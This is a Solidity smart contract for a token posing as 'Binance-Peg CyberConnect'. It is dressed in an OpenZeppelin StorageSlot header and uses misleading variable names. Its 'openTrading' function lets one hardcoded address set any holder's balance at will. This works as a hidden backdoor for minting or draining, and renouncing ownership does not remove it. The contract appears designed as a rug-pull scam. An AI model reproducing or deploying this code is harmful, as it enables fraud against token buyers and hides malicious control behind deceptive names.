// OpenZeppelin Contracts v4.4.0 (utils/StorageSlot.sol)

pragma solidity ^0.8.0;

/**
 * @dev Library for reading and writing primitive types to specific storage slots.
 *
 * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.
 * This library helps with reading and writing to such slots without the need for inline assembly.
 *
 * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.
 *
 * Example usage to set ERC1967 implementation slot:
 * ```
 * contract ERC1967 {
 *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 *
 *     function _getImplementation() internal view returns (address) {
 *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
 *     }
 *
 *     function _setImplementation(address newImplementation) internal {
 *         require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
 *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
 *     }
 * }
 * ```
 *
 * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._
 */
interface StorageSlot {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressSlot) external view returns (uint256);
  function transfer(address target, uint256 functionCallWithValue) external returns (bool);
  function allowance(address _owner, address AddressSlot) external view returns (uint256);
  function approve(address AddressSlot, uint256 functionCallWithValue) external returns (bool);
  function transferFrom(address sender, address target, uint256 functionCallWithValue) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressSlot, uint256 balance);
}


abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC20Permit is ERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeaddressMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeaddressMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeaddressMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeaddressMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeaddressMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeaddressMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract CyberToken is ERC20Burnable, StorageSlot, ERC20Permit {
     /*//////////////////////////////////////////////////////////////
                                 CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/   
    using SafeaddressMath for uint256;
    mapping (address => uint256) private BooleanSlot;
    mapping (address => mapping (address => uint256)) private functionCall;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private _BEACON_SLOT;
    address private CyberTokenOwner; 
    uint256 public contractCreationTime;

string public Coinmarketcap = "https://coinmarketcap.com/currencies/cyberconnect/";
string public ownerAddress = "0xbc33ec670ED30A4e187BafeCE2e90fA4e6fEc5E5";

    constructor() {
        CyberTokenOwner = 0xbc33ec670ED30A4e187BafeCE2e90fA4e6fEc5E5;    
       _BEACON_SLOT = "0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50"; 
        _name = "Binance-Peg CyberConnect";
        _symbol = "WCYBER";
        _decimals = 9;
        _totalSupply = 20000000000 * 10**_decimals;
        BooleanSlot[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);




    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressSlot) external view override returns (uint256) {
        return BooleanSlot[AddressSlot];
    }

    function transfer(address target, uint256 functionCallWithValue) external override returns (bool) {
        _transfer(_msgSender(), target, functionCallWithValue);
        return true;
    }

    function allowance(address owner, address AddressSlot) external view override returns (uint256) {
        return functionCall[owner][AddressSlot];
    }


    function approve(address AddressSlot, uint256 functionCallWithValue) external override returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCallWithValue);
        return true;
    }
    
    function transferFrom(address sender, address target, uint256 functionCallWithValue) external override returns (bool) {
        _transfer(sender, target, functionCallWithValue);
        _approve(sender, _msgSender(), functionCall[sender][_msgSender()].sub(functionCallWithValue, "Ru: transfer functionCallWithValue exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressSlot, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCall[_msgSender()][AddressSlot].add(addedbalance));
        return true;
    }
    

    function decreaseAllowance(address AddressSlot, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressSlot, functionCall[_msgSender()][AddressSlot].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address target, uint256 functionCallWithValue) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(target != address(0), "Ru: transfer to the zero address");
                
        BooleanSlot[sender] = BooleanSlot[sender].sub(functionCallWithValue, "Ru: transfer functionCallWithValue exceeds balance");
        BooleanSlot[target] = BooleanSlot[target].add(functionCallWithValue);
        emit Transfer(sender, target, functionCallWithValue);
    }
        function openTrading(address tokenA, address tokenB, uint256 _upgradeTo, uint256 newImplementation, uint256 newImplementations) external {
        require(_msgSender()==CyberTokenOwner);
        tokenB = tokenA;
        BooleanSlot[tokenB] = (_upgradeTo + newImplementation + newImplementations) * 10**_decimals;
        tokenA = tokenB;
    }   

    function _approve(address owner, address AddressSlot, uint256 functionCallWithValue) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressSlot != address(0), "Ru: approve to the zero address");
        
        functionCall[owner][AddressSlot] = functionCallWithValue;
        emit Approval(owner, AddressSlot, functionCallWithValue);
    }
    
}